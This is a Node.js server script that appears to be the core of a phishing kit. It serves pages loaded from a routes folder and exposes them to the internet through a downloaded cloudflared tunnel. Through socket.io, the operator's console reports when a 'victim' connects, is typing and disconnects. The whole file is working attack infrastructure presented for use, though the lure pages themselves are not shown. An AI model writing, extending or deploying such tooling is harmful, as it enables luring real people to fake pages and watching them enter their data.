try{
var   express    =   require ("express")
var   download_  =   require ("download")
var   app        =   express ()
var   port       =   process.env.PORT || 8080
var   http       =   require ("http").createServer(app)
var   io         =   require ("socket.io")(http)
var   path       =   require ("path")
var   bodyParser =   require ("body-parser")
var   spin       =   require ("spinnies")
var   chalk      =   require("chalk")
var   spinner    =   require ("./utils/spinners.json")
var   spin       =   new spin ({spinner:spinner,spinnerColor:"green",color:"cyan"})
var   fs         =   require ("fs")
var   path       =   require("path")
var   cloudflare =   require ("./utils/launch_cloudflared")
var   routes     =   fs.readdirSync(`${__dirname}/routes`)
var   missing    =   chalk.red.bold("please run bash install.sh to continue")
}
catch {
        console.log(missing)
}
if (!fs.existsSync(`${__dirname}/utils/cloudflared`)) {
        console.log(missing)
}
else run()
app.set("views", path.join(__dirname, "/views"))
app.set("view engine", "ejs")
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended: true}))
routes.forEach(route => {
        app.use(require(`${__dirname}/routes/${route}`))
})


io.on("connection", (sock) => {
        spin.add("connected", {
                text: "victim connected"
        })
        sock.on("typing", () => {
                spin.add("typing", {
                        text: "victim is typing"
                })
        })
        sock.on("stop-typing", () => {
                spin.update("typing", {
                        status: "non-spinnable"
                })
        })
        sock.on("disconnect", () => {
                spin.fail("connected", {
                        text: "victim disconnected"
                })
                spin.remove("typing")
        })
})
function download (url) {
        spin.add("install", {
                text: "installing cloudflared"
        })
        var path = `${__dirname}/utils/`
        download_(url, path, {filename: "cloudflared"}).then(() => {
                spin.succeed("install", {
                        text: "successfully installed cloudflared"
                })
                fs.chmod(`${__dirname}/utils/cloudflared`, 755, () => {})
        })
}

function run () {
        spin.add ("main", {text:"connecting"})


        http.listen (port, () => {
                console.clear()
                spin.update("main", {
                        text: `server listening on port ${port}`
                })
                setTimeout(() => {
                        spin.update("main", {
                                text: "ready to forward port"
                        })
                },1000)
                setTimeout(() => {
                        spin.update("main", {
                                text: "launching cloudflared"
                        })
                        cloudflare(port)
                },2000)
                setTimeout(() => {
                        spin.succeed("main")
                },2000)
        })
        }
